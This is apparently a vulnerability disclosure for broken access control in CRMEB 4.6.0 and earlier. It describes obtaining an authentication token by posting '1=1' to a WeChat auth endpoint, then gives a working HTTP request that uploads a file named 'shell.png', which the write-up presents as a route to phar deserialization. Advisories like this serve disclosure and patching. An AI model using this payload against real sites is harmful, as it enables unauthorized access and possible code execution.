# CRMEB is vulnerable to Broken Access Control
## Description
    CRMEB <= 4.6.0 is vulnerable to Broken Access Control
## Vendor Homepage
    https://gitee.com/ZhongBangKeJi/CRMEB,https://www.crmeb.com/

## Author
    HuBenLab
## Proof of Concept
Through /api/wechat/app_auth post: 1=1 can return the token, by replacing the token can bypass the authentication to upload images and then you can use phar deserialization

![image-20230605163549289](./img/image-20230605163549289.png)

payload

```http
POST /api/upload/image HTTP/1.1
Host: 172.16.5.221
Content-Length: 287
Authori-zation: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJsaWFvdHQudC5jZHFseC5jb20iLCJhdWQiOiJsaWFvdHQudC5jZHFseC5jb20iLCJpYXQiOjE2NzM0OTk4NDksIm5iZiI6MTY3MzQ5OTg0OSwiZXhwIjoxNjc2MDkxODQ5LCJqdGkiOnsiaWQiOjExODUsInR5cGUiOiJ3ZWNoYXQifX0.cc-_5lJJIxBmUc2MR31ydX3GRFHT4cwH5aiHPtcE6yg
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryO3BpijrHT2ypfQ6z
Accept: */*
Origin: http://172.16.5.221
Referer: http://172.16.5.221/pages/users/user_info/index
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: cb_lang=zh-cn; WS_ADMIN_URL=ws://172.16.5.221/notice; WS_CHAT_URL=ws://172.16.5.221/msg; PHPSESSID=fb53477e921d8cb7aa9db4248abd6dce
Connection: close

------WebKitFormBoundaryO3BpijrHT2ypfQ6z
Content-Disposition: form-data; name="filename"

pics
------WebKitFormBoundaryO3BpijrHT2ypfQ6z
Content-Disposition: form-data; name="pics"; filename="shell.png"
Content-Type: image/png

GIF89a
------WebKitFormBoundaryO3BpijrHT2ypfQ6z--
```

![image-20230605163927953](./img/image-20230605163927953.png)